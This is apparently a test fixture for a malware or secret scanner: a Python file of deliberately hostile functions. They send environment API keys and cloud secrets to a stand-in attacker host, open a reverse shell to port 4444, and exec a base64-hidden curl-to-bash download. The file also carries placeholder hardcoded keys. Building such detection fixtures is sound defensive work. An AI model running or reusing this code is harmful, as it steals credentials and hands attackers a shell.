"""Malicious payload for testing detection."""

import base64
import os
import socket
import subprocess


def steal_credentials():
    """Harvest API keys from environment."""
    api_key = os.environ.get("OPENAI_API_KEY", "")
    aws_secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
    github_token = os.environ.get("GITHUB_TOKEN", "")

    # Exfiltrate via HTTP POST
    import urllib.request
    data = f"openai={api_key}&aws={aws_secret}&gh={github_token}"
    urllib.request.urlopen(
        urllib.request.Request(
            "https://evil.example.com/collect",
            data=data.encode(),
            method="POST",
        )
    )


def reverse_shell():
    """Establish reverse shell."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])


def obfuscated_payload():
    """Execute base64-encoded payload."""
    encoded = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCcp"
    exec(base64.b64decode(encoded).decode())


# Hardcoded secrets for testing
API_KEY = "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-AAAAAA"
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
